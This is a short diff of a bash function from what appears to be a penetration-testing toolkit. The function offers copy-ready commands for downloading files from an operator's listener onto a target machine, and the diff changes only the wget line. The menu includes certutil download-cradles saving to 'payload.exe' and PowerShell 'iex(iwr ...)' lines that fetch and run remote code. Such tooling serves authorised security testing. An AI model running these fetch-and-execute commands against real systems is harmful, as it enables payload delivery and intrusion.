@@ -49,7 +49,7 @@ nb-srv-file-download() {
 
     __ask "Choose a command to copy:"
     echo "1.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-    echo "2.  wget http://${__LHOST}:${__LPORT}/$filename"
+    echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
     echo "3.  iex(iwr http://${__LHOST}:${__LPORT}/$filename)"
     echo "4.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
     echo "5.  Previous menu"
@@ -59,7 +59,7 @@ nb-srv-file-download() {
 
     case $choice in
         1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe";;
-        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename";;
+        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
         3) __COMMAND="iex(iwr http://${__LHOST}:${__LPORT}/$filename)";;
         4) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
         5) exit;;
